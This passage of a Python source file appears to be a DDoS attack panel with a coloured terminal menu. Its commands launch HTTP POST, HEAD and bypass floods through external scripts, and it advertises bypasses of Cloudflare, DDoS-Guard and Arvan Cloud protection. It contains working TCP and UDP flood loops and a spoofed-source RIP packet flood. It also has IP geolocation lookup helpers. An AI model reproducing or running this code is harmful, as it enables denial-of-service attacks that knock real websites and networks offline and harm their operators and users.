            print(f'Target={target} Threads={threads} Multi={multi} Time={timeout}')
            os.system(f"python3 start.py post {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-postv2':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-postv2   \x1b[38;2;224;0;255mVery Strong HTTP-POSTv2 Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m●TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            print(f'Target={target} Threads={threads} Multi={multi} Time={timeout}')
            os.system(f"python3 start.py postv2 {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-head':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-head   \x1b[38;2;224;0;255mVery Strong HTTP-HEAD Attack to Websites")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py head {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-bypass':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-bypass   \x1b[38;2;224;0;255mSimple method to Bypass Normal Anti-DDOS")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py bypass {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'mh-null':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mmh-null     \x1b[38;2;224;0;255mYou Need To Multi Run To Get Stronger")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py null {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'http-raw':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mhttp-raw   \x1b[38;2;224;0;255mSend 1 very powerful package to website.")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop or wait for the attack to end")
            os.system(f"node HTTP-RAW.js {target} {timeout}")
            main()
        elif ray == 'cf-bypass':
            print(__banner__)
            menu()
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mcf-bypass   \x1b[38;2;224;0;255mBest method to Bypass Cloudflare")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            try:
                os.system(f"node cf.js {target} {timeout}")
            except:
                print("Attack Error!")
            main()
        elif ray == 'dg-bypass':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mdg-bypass   \x1b[38;2;224;0;255mBest method to Bypass DDoS-Guard (mh)")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py dgb {target} 5 {threads} socks5.txt {multi} {timeout}")
            main()
        elif ray == 'tcp':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mtcp   \x1b[38;2;224;0;255mSend many TCP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m● IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m● PORT:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m● PACKETS:\x1b[38;2;194;255;248m")
            size = input("\x1b[38;2;3;63;125m● SIZE (BYTES):\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = random._urandom(int(size))

            while time.time() < times:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(target), int(port)))
                    for _ in range(int(packets)):
                        s.send(data)
                except:
                    s.close()
            main()

        elif ray == 'udp':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mudp   \x1b[38;2;224;0;255mSend many UDP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m● IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m● PORT:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m● PACKETS:\x1b[38;2;194;255;248m")
            size = input("\x1b[38;2;3;63;125m● SIZE (BYTES):\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = random._urandom(int(size))

            while time.time() < times:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(int(packets)):
                        s.sendto(data, (str(target), int(port)))
                except:
                    s.close()
            main()

        elif ray == 'rip':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mrip   \x1b[38;2;224;0;255mSend many RIP packets per second to IP")
            print("")
            target = input("\x1b[38;2;3;63;125m● IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m● PORT (520 = RIP):\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            packets = input("\x1b[38;2;3;63;125m● PACKETS:\x1b[38;2;194;255;248m")

            times = int(time.time()) + int(timeout)

            data = "\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10"

            while time.time() < times:
                try:
                    packet = (
                    IP(src=target)
                    / UDP(dport=int(port))
                    / Raw(load=data))
                    for _ in range(int(packets)):
                        send(packet, count=int(packets), verbose=False)
                except:
                    s.close()
            main()
        
        elif 'status' in ray:
            try:
                web = ray.split()[1]
                try:
                    r = requests.get(f'{web}')
                    print("Status code: "+str(r.status_code))
                except:
                    print("An error has occurred or the page is down")
            except IndexError:
                print('''Usage: status <website>''')

        elif 'lookup' in ray:
            print("")
            try:
                target = ray.split()[1]
                try:
                    r = requests.post("http://ip-api.com/batch?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy", json=[
                        {"query": f'{target}'
                        }]).json()
                except:
                    print("An error has occurred")
                try:
                    for info in r:
                        print('Status            : '+info["status"])
                        print('Country           : '+info["country"])
                        print("Country Code      : "+info["countryCode"])
                        print("Region/State      : "+info["region"])
                        print("Region/State Name : "+info["regionName"])
                        print("City              : "+info["city"])
                        print("Zip Code          : "+info["zip"])
                        print("Latitude          : "+str(info["lat"]))
                        print("Longitude         : "+str(info["lon"]))
                        print("Timezone          : "+info["timezone"])
                        print("ISP               : "+info["isp"])
                        print("Org               : "+info["org"])
                        print("As                : "+info["as"])
                        print("Mobile            : "+str(info["mobile"]))
                        print("Proxy             : "+str(info["proxy"]))
                        print("")
                except:
                    print("Error")
            except IndexError:
                print("Usage: lookup <ip>")

        elif ray == 'clear':
            main()

        elif ray == 'exit' or ray == 'bye':
            print("Bye!")
            time.sleep(1)
            sys.exit()

        elif ray == 'help':
            print(f'''
                       ╔══════════════════════════════╗
                          ╔═╗╦  ╦    ╔╦╗╔═╗╔═╗╦  ╔═╗
                          ╠═╣║  ║     ║ ║ ║║ ║║  ╚═╗
                          ╩ ╩╩═╝╩═╝   ╩ ╚═╝╚═╝╩═╝╚═╝
                       ╚═══╦══════════════════════╦═══╝
                        ╔══╩══════════════════════╩══╗ 
                        ║ • LAYER7          • LAYER4 ║
                        ║                            ║
                        ║ • BEST            • CLEAR  ║
                        ║                            ║
                        ║         • TOOLS            ║
                        ╚═════╦═════════════╦════════╝
                              ║   • EXIT    ║
                              ╚═════════════╝ 
            ''')

        #elif ray == 'goat-bypass':
            #clear()
            #print(__banner__)
            #print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mgoat-bypass   \x1b[38;2;224;0;255mBest bypass & website flooder in RayNet")
            #print("")
            #target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            #timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            #requests = input("\x1b[38;2;3;63;125m● REQUESTS:\x1b[38;2;194;255;248m")
            #print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            #os.system(f"node method.js {target} {timeout} request {requests}")
            #main()

        elif 'webip' in ray:
            try:
                ip = ray.split()[1]
                try:
                    print(socket.gethostbyname(f'{ip}'))
                except:
                    print('An error has occurred')
            except IndexError:
                print('Usage: webip <website>')
                print('Example: webip google.com')

        elif 'myip' in ray:
            try:
                print(requests.get('http://www.ifconfig.me').text)
            except:
                print("Error")
        
        elif 'whoami' in ray:
            print(f'\033[1;mUsername \x1b[38;2;255;32;96m*\033[1;m: \x1b[38;2;255;96;32mVendetta \033[1;mRoot \x1b[38;2;255;32;96m*\033[1;m: \x1b[38;2;41;238;56myes \033[1;mExpires in\x1b[38;2;255;32;96m=\033[1;m∞')
        
        elif ray == 'http-socket':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mhttp-socket   \x1b[38;2;224;0;255mSimple HTTP-Get flood with Socket")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"node socket.js {target} http.txt {timeout} GET")
            main()

        elif ray == 'av-bypass':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189mav-bypass   \x1b[38;2;224;0;255mArvan Cloud Bypass (mh)")
            print("")
            target = input("\x1b[38;2;3;63;125m● URL:\x1b[38;2;194;255;248m")
            threads = input("\x1b[38;2;3;63;125m● THREADS:\x1b[38;2;194;255;248m")
            multi = input("\x1b[38;2;3;63;125m● MULTI:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"python3 start.py avb {target} 5 {threads} socks5.txt {multi} {timeout}")

        elif ray == 'ovh-raw':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189movh-raw   \x1b[38;2;224;0;255mOVH-RAW Attack (Layer 7 & Layer 4)")
            print("")
            target = input("\x1b[38;2;3;63;125m● IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m● PORT:\x1b[38;2;194;255;248m")
            timeout = input("\x1b[38;2;3;63;125m● TIME:\x1b[38;2;194;255;248m")
            method = input("\x1b[38;2;3;63;125m● METHOD [GET/POST/HEAD]:\x1b[38;2;194;255;248m")
            connections = input("\x1b[38;2;3;63;125m● CONNECTIONS:\x1b[38;2;194;255;248m")     
            print("\x1b[38;2;3;63;125m▶ CTRL + C To Stop")
            os.system(f"sudo ./ovh-raw {method} {ip} {port} {timeout} {connections}")
            main()

        elif ray == 'ovh-raw':
            clear()
            print(__banner__)
            print("\x1b[38;2;3;63;125m▶ \x1b[38;2;0;255;189movh-amp   \x1b[38;2;224;0;255mOVH Amplification Attack")
            print("")
            target = input("\x1b[38;2;3;63;125m● IP:\x1b[38;2;194;255;248m")
            port = input("\x1b[38;2;3;63;125m● PORT:\x1b[38;2;194;255;248m")
            print("\x1b[38;2;3;63;125m● CTRL + C To Stop")
            os.system(f"sudo ./OVH-AMP {ip} {port}")
            main()
            
        else:
            try:
                cmmnd = str(ray.split()[0])
                print("Command " + cmmnd + " Not Found!")
            except IndexError:
                pass

if __name__ == "__main__":
    try:
        os.system('title YonNet T.O.S' if os.name == 'nt' else 'clear')
        tos()
        time.sleep(3)
        os.system('title YonNet v2 - Methods [9] - Bypass [2] - Tools [5] - Users [1]' if os.name == 'nt' else 'clear')
        main()
    except KeyboardInterrupt:
        print("\nBye!")
